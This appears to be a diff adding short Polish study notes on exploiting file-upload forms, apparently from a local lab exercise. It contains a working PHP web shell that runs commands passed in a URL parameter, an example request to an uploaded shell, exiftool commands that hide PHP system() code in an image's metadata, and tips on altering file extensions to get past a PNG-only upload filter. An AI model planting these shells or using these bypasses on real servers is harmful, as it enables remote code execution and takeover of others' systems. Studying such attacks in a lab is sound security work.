@@ -1,0 +1,20 @@
+Robimy plik z kodem w php i dodajemy do na serwer jako plik
+Żeby polecenia podawać w url, a nie w skrypcie
+
+Tak ma być
+
+$output2 = system($_GET["arg"]);
+echo "<pre>$output2</pre>";
+
+http://127.0.0.1:10001/uploads/1733742625_ex1v2.php?arg=pwd
+
+Zmieniamy tak url
+
+W komentarzu za pomocą exiftoola można dodać komentarz z kodem php
+Musi być rozszerzenie php nawet w zdjęciu żeby się udało
+exiftool -comment=<?php system('ls -la'); ?>" plik
+exiftool -Comment="<?php system('ls -la'); ?>" example.jpg
+Trzeba zmienić rozszerzenie na php, bo nawet jak jest zdjęcie, to takie musi być rozszerzenie żeby RCE się wykonało
+
+Żeby zmienić rozszerzenie spacje na początku, a potem w hexeditorze zmienić rozszerzenie na png
+Wtedy nawet jak jest zapisane jak html to możemy to wrzucić chociaż że teoretycznie jako przyjmuje tylko png
